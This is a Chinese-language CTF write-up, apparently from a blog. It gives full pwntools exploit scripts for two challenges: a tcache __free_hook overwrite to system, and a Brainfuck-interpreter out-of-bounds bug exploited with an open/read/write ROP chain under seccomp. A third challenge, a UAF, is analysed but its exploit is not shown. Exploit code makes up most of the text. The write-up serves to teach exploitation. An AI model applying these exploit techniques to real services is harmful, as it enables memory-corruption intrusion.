<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./webheap&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chuj.top&#x27;</span>, <span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b* \n&quot;)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x4918)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setuint</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x&gt;=<span class="number">0</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7f</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x80</span>)+p8(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x80</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7fff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x81</span>)+p16(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x8000</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7fffffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x82</span>)+p32(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x80000000</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7fffffffffffffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x83</span>)+p64(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setint</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x &gt;= <span class="number">0</span> <span class="keyword">and</span> x &lt;= <span class="number">0xff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x84</span>)+p8(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x100</span> <span class="keyword">and</span> x&lt;=<span class="number">0xffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x85</span>)+p16(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x10000</span> <span class="keyword">and</span> x&lt;=<span class="number">0xffffffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x86</span>)+p32(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_code</span>(<span class="params">op, idx, size, num1,num2</span>):</span></span><br><span class="line">    payload = p8(<span class="number">0xb9</span>) + p8(<span class="number">0x05</span>)</span><br><span class="line">    payload += setint(op) + setuint(idx) +setuint(size) + <span class="string">&#x27;\xBD&#x27;</span>+setuint(num1)+p8(<span class="number">0</span>)+setuint(num2)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Packet length: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    <span class="keyword">return</span> send_code(<span class="number">0</span>,idx,size,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> send_code(<span class="number">1</span>,idx,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> send_code(<span class="number">2</span>,idx,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,cont</span>):</span></span><br><span class="line">    payload = p8(<span class="number">0xb9</span>) + p8(<span class="number">0x05</span>)</span><br><span class="line">    payload += p8(<span class="number">3</span>) +p8(idx) + p8(<span class="number">0x30</span>) + <span class="string">&#x27;\xBD&#x27;</span>+p8(<span class="number">6</span>)+p64(cont)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Packet length: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libcbase=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">system=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook=libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">one_gadget = libcbase + one_gadgets[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;libcbase &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,free_hook)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x30</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x6873</span>)</span><br><span class="line">edit(<span class="number">3</span>,system)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="bfbf"><a href="#bfbf" class="headerlink" title="bfbf"></a>bfbf</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.8</span>)</span> stable release version 2.31.\n</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=e3bffe1cec71dcd6694ca6bd031a59f4855b9b86, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != read) <span class="keyword">goto</span> <span class="number">0006</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = fd <span class="meta"># read(fd, buf, count)</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x25</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A &gt; <span class="number">0x1</span>) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>限制了 <code>read</code>（其实也 ban 了 <code>execve</code>，但这里没有显示）</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>题目就是想模仿 Brainfuck 语言</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">char</span> buf[<span class="number">520</span>]; <span class="comment">// [rsp+10h] [rbp-210h] BYREF</span></span><br><span class="line">......</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">          write(<span class="number">1</span>, &amp;buf[i], <span class="number">1uLL</span>);</span><br><span class="line">          <span class="keyword">goto</span> <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">          buf[i] = getchar();</span><br></pre></td></tr></table></figure>
<ul>
<li>没有对“i”进行限制</li>
<li>利用 “.” 和 “&gt;” 的配合可以实现 leak</li>
<li>利用 “,” 和 “&gt;” 的配合可以覆盖 ret</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>泄露完整之后，直接覆盖返回地址为 ORW 的变种</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.51.221.205&#x27;</span>, <span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x18CD)\n&quot;</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&gt;&#x27;</span>*(<span class="number">512</span>+<span class="number">5</span>*<span class="number">8</span>) + <span class="string">b&#x27;.&gt;&#x27;</span> * <span class="number">7</span> + <span class="string">b&#x27;.&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;&gt;&#x27;</span>*(<span class="number">1</span>*<span class="number">8</span>) + <span class="string">b&#x27;.&gt;&#x27;</span> * <span class="number">7</span> + <span class="string">b&#x27;.&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;&lt;&#x27;</span>*(<span class="number">4</span>*<span class="number">8</span>-<span class="number">1</span>+<span class="number">7</span>)+<span class="string">b&#x27;,&gt;&#x27;</span>*<span class="number">0xb8</span> + <span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">heapbase = u64(p.recvuntil(<span class="string">b&#x27;\x56&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x2a0</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">log.success(<span class="string">&quot;heapbase: &quot;</span>+<span class="built_in">hex</span>(heapbase))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x24083</span></span><br><span class="line">log.success(<span class="string">&quot;libc.address: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">open_addr = libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">flag_addr = <span class="number">0x684</span>+heapbase</span><br><span class="line">pop_rax_ret=libc.address+<span class="number">0x0000000000036174</span></span><br><span class="line">pop_rdi_ret=libc.address+<span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi_ret=libc.address+<span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx_ret=libc.address+<span class="number">0x0000000000142c92</span></span><br><span class="line">syscall_ret=libc.address+<span class="number">0x630a9</span></span><br><span class="line"></span><br><span class="line">payload =  p64(pop_rax_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(flag_addr)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(heapbase)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x30</span>) </span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;_exit&#x27;</span>]) </span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="store"><a href="#store" class="headerlink" title="store"></a>store</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.2</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">store: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.31</span><span class="number">-0u</span>buntu9_amd64/ld<span class="number">-2.31</span>.so, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=cd388e748e0640343faaa81f9d2a6fccd07ff729, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">➜  store seccomp-tools dump ./store                </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0e</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0016</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x13</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0024</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x11</span> <span class="number">0x00</span> <span class="number">0x0000000c</span>  <span class="keyword">if</span> (A == brk) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x10</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x0f</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x0e</span> <span class="number">0x00</span> <span class="number">0x00000005</span>  <span class="keyword">if</span> (A == fstat) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x0d</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x0c</span> <span class="number">0x00</span> <span class="number">0x0000003c</span>  <span class="keyword">if</span> (A == <span class="built_in">exit</span>) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x0b</span> <span class="number">0x00</span> <span class="number">0x0000005a</span>  <span class="keyword">if</span> (A == chmod) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x0a</span> <span class="number">0x00</span> <span class="number">0x0000008c</span>  <span class="keyword">if</span> (A == getpriority) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x09</span> <span class="number">0x00</span> <span class="number">0x0000008d</span>  <span class="keyword">if</span> (A == setpriority) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x000000c0</span>  <span class="keyword">if</span> (A == lgetxattr) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x08</span> <span class="number">0x000000e6</span>  <span class="keyword">if</span> (A == clock_nanosleep) <span class="keyword">goto</span> <span class="number">0023</span> <span class="keyword">else</span> <span class="keyword">goto</span> <span class="number">0024</span></span><br><span class="line"> <span class="number">0016</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x07</span> <span class="number">0x40000003</span>  <span class="keyword">if</span> (A != ARCH_I386) <span class="keyword">goto</span> <span class="number">0024</span></span><br><span class="line"> <span class="number">0017</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0018</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000005</span>  <span class="keyword">if</span> (A == fstat) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0019</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x0000005a</span>  <span class="keyword">if</span> (A == chmod) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0020</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000008c</span>  <span class="keyword">if</span> (A == getpriority) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0021</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000008d</span>  <span class="keyword">if</span> (A == setpriority) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0022</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x000000c0</span>  <span class="keyword">if</span> (A != lgetxattr) <span class="keyword">goto</span> <span class="number">0024</span></span><br><span class="line"> <span class="number">0023</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0024</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( free_num )                            </span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>((&amp;chunk_list)[index]);               <span class="comment">// UAF</span></span><br><span class="line">  --free_num;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;success!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>UAF</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>本题目的限制如下：</p>
<ul>
<li>只能控制申请的头两个 chunk</li>
<li>限制释放次数为4次</li>
</ul>
